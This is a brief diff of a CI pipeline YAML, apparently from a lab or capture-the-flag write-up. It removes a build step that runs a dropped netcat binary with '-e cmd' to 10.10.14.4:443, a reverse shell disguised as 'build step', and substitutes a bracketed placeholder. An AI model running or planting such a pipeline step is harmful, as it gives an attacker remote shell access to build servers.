@@ -145,7 +145,7 @@ trigger:
 pool: 'Setup'
 
 steps:
-- script: c:\programdata\iceberg-nc.exe -e cmd 10.10.14.4 443
+- script: "[ reverse shell from the dropped nc.exe to 10.10.14.4:443 ]"
   displayName: 'build step'
 ```
 
